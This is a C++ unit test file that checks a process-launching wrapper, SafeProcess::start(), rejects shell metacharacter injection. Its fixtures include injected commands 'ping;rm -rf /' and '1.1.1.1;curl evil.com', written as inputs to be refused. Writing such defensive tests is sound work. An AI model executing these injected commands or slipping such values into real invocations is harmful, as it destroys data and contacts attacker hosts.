// ═══════════════════════════════════════════════════════════════════════════════
//  IPView Pro v2.15.0 — tests/test_safeprocess.cpp
//
//  Validates the SafeProcess::start() wrapper. We do not actually
//  launch a child process — we only check that the validation path
//  refuses to construct a QProcess for unsafe inputs.
// ═══════════════════════════════════════════════════════════════════════════════

#include "TestFramework.hpp"
#include "../SafeProcess.hpp"
#include "../Error.hpp"

#include <QStringList>

IPVIEW_TEST_CASE(safeprocess_rejects_metachar_program,
    auto const r = IPView::SafeProcess::start(
        QStringLiteral("ping;rm -rf /"),
        QStringList{});
    IPVIEW_CHECK(!r.has_value());
    IPVIEW_CHECK_EQ(static_cast<int>(r.error().code),
                    static_cast<int>(IPView::Error::ShellMetachars))
)

IPVIEW_TEST_CASE(safeprocess_rejects_metachar_argument,
    auto const r = IPView::SafeProcess::start(
        QStringLiteral("/usr/bin/ping"),
        QStringList{QStringLiteral("1.1.1.1;curl evil.com")});
    IPVIEW_CHECK(!r.has_value());
    IPVIEW_CHECK_EQ(static_cast<int>(r.error().code),
                    static_cast<int>(IPView::Error::ShellMetachars))
)

IPVIEW_TEST_CASE(safeprocess_accepts_clean_invocation,
    auto const r = IPView::SafeProcess::start(
        QStringLiteral("/usr/bin/ping"),
        QStringList{QStringLiteral("-c"), QStringLiteral("4"),
                    QStringLiteral("1.1.1.1")});
    IPVIEW_REQUIRE(r.has_value());
    IPVIEW_CHECK(r.value() != nullptr);
    IPVIEW_CHECK_EQ(r.value()->program(), QStringLiteral("/usr/bin/ping"));
    IPVIEW_CHECK_EQ(r.value()->arguments().size(), 3)
)

IPVIEW_TEST_CASE(safeprocess_records_timeout_on_qobject,
    auto const r = IPView::SafeProcess::start(
        QStringLiteral("/usr/bin/sleep"),
        QStringList{QStringLiteral("10")},
        std::chrono::milliseconds{1234});
    IPVIEW_REQUIRE(r.has_value());
    IPVIEW_CHECK_EQ(r.value()->property("ipviewTimeoutMs").toLongLong(), 1234)
)
